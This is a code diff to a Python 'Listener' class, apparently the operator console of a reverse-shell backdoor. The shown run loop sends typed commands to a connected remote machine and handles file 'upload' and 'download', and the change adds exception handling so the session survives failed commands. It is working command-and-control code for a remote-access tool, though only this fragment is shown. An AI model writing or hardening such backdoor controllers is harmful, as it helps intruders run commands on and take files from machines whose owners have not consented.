@@ -37,19 +37,23 @@ class Listener:
 
     def run(self):
         while True:
-            commands = input("=>").split(' ')
-            if commands[0] == "upload":
-                content = self.send_file(commands[1])
-                content = content.decode()
-                commands.append(content)
-            self.send_reliably(commands)
+            try:
+                commands = input("=>").split(' ')
+                if commands[0] == "upload":
+                    content = self.send_file(commands[1])
+                    content = content.decode()
+                    commands.append(content)
+                self.send_reliably(commands)
 
-            if commands[0] == "exit":
-                self.conn.close()
-                exit()
-            result = self.recv_reliably()
-            if commands[0] == "download":
-                result = self.write_file(commands[1], result)
+                if commands[0] == "exit":
+                    self.conn.close()
+                    exit()
+                result = self.recv_reliably()
+                if commands[0] == "download" and "[-] Error" not in result:
+                    result = self.write_file(commands[1], result)
+
+            except Exception:
+                result = "[-] Error in execution of command :("
             print(result)
 
 
